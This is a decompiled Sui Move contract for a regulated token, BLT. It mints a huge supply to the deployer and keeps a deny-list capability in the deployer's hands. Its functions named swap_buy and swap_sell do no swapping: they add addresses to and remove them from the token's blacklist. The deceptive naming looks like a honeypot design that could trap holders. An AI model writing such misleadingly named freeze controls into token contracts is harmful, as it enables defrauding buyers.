module 0x322456560d3a3b83a22c0100a806c848b62cbaded162316ad5a3c2d1d96a0d8e::blt {
    struct BLT has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: BLT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BLT>(arg0, 9, b"BLT", b"BLTCOIN", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmNRLBfH34DftXcJsPNngSnQJydcizJwmC8aknUcmTp7cF"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<BLT>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BLT>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BLT>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BLT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BLT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BLT>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BLT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<BLT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

